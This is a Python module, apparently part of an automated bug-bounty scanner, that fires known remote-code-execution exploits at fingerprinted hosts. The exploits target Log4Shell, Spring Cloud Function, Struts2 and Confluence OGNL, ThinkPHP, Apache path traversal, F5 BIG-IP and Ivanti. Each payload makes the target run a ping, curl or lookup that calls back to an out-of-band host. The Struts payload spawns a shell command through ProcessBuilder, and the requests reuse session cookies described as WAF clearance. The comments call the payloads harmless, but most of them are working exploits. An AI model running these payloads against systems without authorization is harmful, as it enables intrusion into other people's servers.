import asyncio
import aiohttp
import logging
from urllib.parse import urlparse
from rich.console import Console

console = Console()
log = logging.getLogger("rich")

# --- THE SURGICAL PAYLOAD MATRIX ---
# These payloads do NOT execute malicious code. They strictly trigger a DNS lookup 
# to your Interactsh daemon to safely prove arbitrary code execution for Bug Bounty triage.

def generate_payloads(tech_stack, oast_domain):
    payloads = []
    
    if "log4j" in tech_stack or "java" in tech_stack or "spring" in tech_stack:
        # Log4Shell (CVE-2021-44228) - Header Injection
        payloads.append({
            "name": "Log4Shell (CVE-2021-44228)",
            "headers": {"X-Api-Version": f"${{jndi:ldap://log4j.{oast_domain}/a}}", "User-Agent": f"${{jndi:ldap://log4j.{oast_domain}/a}}"},
            "params": {}
        })
        
    if "spring boot" in tech_stack or "spring" in tech_stack:
        # Spring4Shell (CVE-2022-22965) / Spring Cloud (CVE-2022-22963)
        payloads.append({
            "name": "Spring Cloud Function RCE (CVE-2022-22963)",
            "headers": {"spring.cloud.function.routing-expression": f"T(java.net.InetAddress).getByName('spring.{oast_domain}')"},
            "params": {}
        })

    if "apache struts" in tech_stack or "struts" in tech_stack:
        # Apache Struts2 (CVE-2017-5638) - Content-Type OGNL Injection
        ognl_payload = f"%{{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ping -c 1 struts.{oast_domain}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{{'cmd.exe','/c',#cmd}}:{{'/bin/bash','-c',#cmd}})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}}"
        payloads.append({
            "name": "Apache Struts2 OGNL (CVE-2017-5638)",
            "headers": {"Content-Type": ognl_payload},
            "params": {}
        })

    if "confluence" in tech_stack or "atlassian" in tech_stack:
        # Confluence OGNL (CVE-2022-26134) - URI Injection (handled in execution loop)
        payloads.append({
            "name": "Confluence OGNL (CVE-2022-26134)",
            "headers": {},
            "params": {},
            "uri_append": f"/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22ping%20-c%201%20confluence.{oast_domain}%22%29%7D/"
        })

    if "php" in tech_stack or "apache" in tech_stack or "nginx" in tech_stack:
        # ThinkPHP RCE
        payloads.append({
            "name": "ThinkPHP RCE (CVE-2018-20062)",
            "headers": {},
            "params": {},
            "uri_append": f"/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1]=curl%20http://thinkphp.{oast_domain}"
        })
        # Apache Path Traversal to RCE
        payloads.append({
            "name": "Apache HTTP Server RCE (CVE-2021-41773)",
            "headers": {},
            "params": {},
            "uri_append": f"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh?=|echo+Content-Type:+text/plain;+echo;+curl+http://apache.{oast_domain}"
        })

    if "f5" in tech_stack or "big-ip" in tech_stack:
        # F5 BIG-IP RCE
        payloads.append({
            "name": "F5 BIG-IP RCE (CVE-2020-5902)",
            "headers": {},
            "params": {},
            "uri_append": f"/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=curl+http://f5.{oast_domain}"
        })

    if "ivanti" in tech_stack or "pulse" in tech_stack:
        # Ivanti Connect Secure SSRF
        payloads.append({
            "name": "Ivanti Connect Secure SSRF (CVE-2024-21893)",
            "headers": {},
            "params": {},
            "uri_append": f"/api/v1/totp/user-backup?user=a&v=1&url=http://ivanti.{oast_domain}"
        })

    return payloads

async def fire_surgical_strike(client, target, tech_stack, oast_domain):
    payloads = generate_payloads(tech_stack, oast_domain)
    if not payloads: return

    for payload in payloads:
        target_url = target
        if "uri_append" in payload:
            parsed = urlparse(target)
            target_url = f"{parsed.scheme}://{parsed.netloc}{payload['uri_append']}"

        try:
            # We fire the payload and don't care about the HTTP response.
            # RCE is proven purely if the OAST daemon catches the pingback in Phase 8.
            async with client.get(target_url, headers=payload.get("headers", {}), timeout=5, ssl=False) as r:
                pass
            console.print(f"  [dim]+ Fired {payload['name']} at {target_url}[/dim]")
        except Exception:
            pass

async def deploy_sniper(session_state, targets_with_tech):
    # 1. Fetch the persistent WAF clearance from Cerberus
    connector = aiohttp.TCPConnector(limit=15, ssl=False)
    headers = getattr(session_state, 'auth_headers', {})
    cookies = getattr(session_state, 'auth_cookies', {})
    
    # 2. Extract the local Interactsh domain
    try:
        with open(".oast_payload.txt", "r") as f:
            oast_domain = f.read().strip()
    except:
        oast_domain = "oast.fun"

    # 3. Fire the weapons concurrently, wrapped in the authenticated session
    async with aiohttp.ClientSession(connector=connector, headers=headers, cookies=cookies) as client:
        tasks = []
        for url, tech in targets_with_tech.items():
            tasks.append(fire_surgical_strike(client, url, tech, oast_domain))
        await asyncio.gather(*tasks)

def run_cve_sniper(session, config):
    console.print("\n[bold blue]━━ PHASE 4.5: THE CVE SNIPER (SURGICAL OAST INJECTION) ━━[/bold blue]")
    
    targets_with_tech = {}
    for h in session.get_live_hosts():
        if isinstance(h, dict) and 'url' in h and 'tech' in h:
            # Only load targets where we successfully identified the underlying technology
            tech_lower = " ".join([t.lower() for t in h['tech']])
            if any(trigger in tech_lower for trigger in ["java", "spring", "struts", "log4j", "confluence", "atlassian", "php", "apache", "nginx", "f5", "big-ip", "ivanti", "pulse"]):
                targets_with_tech[h['url']] = tech_lower

    if not targets_with_tech:
        console.print("WARNING  No high-value tech stacks (Java/Spring/Atlassian) identified. Slipping Sniper phase.")
        return

    console.print(f"INFO     Arming surgical OAST payloads for {len(targets_with_tech)} profiled targets...")
    asyncio.run(deploy_sniper(session, targets_with_tech))
    console.print("[green]  + Sniper execution complete. Awaiting asynchronous OAST callbacks in Phase 8.[/green]")
